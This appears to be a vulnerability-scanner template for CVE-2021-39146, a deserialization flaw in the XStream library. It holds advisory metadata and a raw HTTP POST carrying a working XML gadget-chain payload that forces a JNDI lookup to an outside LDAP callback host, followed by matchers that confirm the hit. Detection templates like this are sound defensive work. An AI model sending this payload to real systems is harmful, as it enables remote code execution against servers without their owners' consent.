id: CVE-2021-39146

info:
  name: XStream - Arbitrary Code Execution
  author: pwnhxl
  severity: high
  description: |
    XStream is a simple library to serialize objects to XML and back again. In affected versions this vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.
    XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.
  reference:
    - https://x-stream.github.io/CVE-2021-39146.html
    - https://github.com/x-stream/xstream/security/advisories/GHSA-p8pq-r894-fm8f
    - https://security.netapp.com/advisory/ntap-20210923-0003/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 8.5
    cve-id: CVE-2021-39146
    cwe-id: CWE-502,CWE-434
  tags: cve,cve2021,xstream,deserialization,rce

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <sorted-set>
          <javax.naming.ldap.Rdn_-RdnEntry>
            <type>test</type>
            <value class='javax.swing.MultiUIDefaults' serialization='custom'>
              <unserializable-parents/>
              <hashtable>
                  <default>
                    <loadFactor>0.75</loadFactor>
                    <threshold>525</threshold>
                  </default>
                  <int>700</int>
                  <int>0</int>
              </hashtable>
              <javax.swing.UIDefaults>
                  <default>
                    <defaultLocale>zh_CN</defaultLocale>
                    <resourceCache/>
                  </default>
              </javax.swing.UIDefaults>
              <javax.swing.MultiUIDefaults>
                  <default>
                    <tables>
                    <javax.swing.UIDefaults serialization='custom'>
                      <unserializable-parents/>
                      <hashtable>
                        <default>
                          <loadFactor>0.75</loadFactor>
                          <threshold>525</threshold>
                        </default>
                        <int>700</int>
                        <int>1</int>
                        <string>lazyValue</string>
                        <javax.swing.UIDefaults_-ProxyLazyValue>
                          <className>javax.naming.InitialContext</className>
                          <methodName>doLookup</methodName>
                          <args>
                            <string>ldap://{{interactsh-url}}/#evil</string>
                          </args>
                        </javax.swing.UIDefaults_-ProxyLazyValue>
                      </hashtable>
                      <javax.swing.UIDefaults>
                        <default>
                          <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>
                          <resourceCache/>
                        </default>
                      </javax.swing.UIDefaults>
                    </javax.swing.UIDefaults>
                    </tables>
                  </default>
              </javax.swing.MultiUIDefaults>
            </value>
          </javax.naming.ldap.Rdn_-RdnEntry>
          <javax.naming.ldap.Rdn_-RdnEntry>
            <type>test</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
              <m__obj class='string'>test</m__obj>
            </value>
          </javax.naming.ldap.Rdn_-RdnEntry>
        </sorted-set>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - "timestamp"

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 500
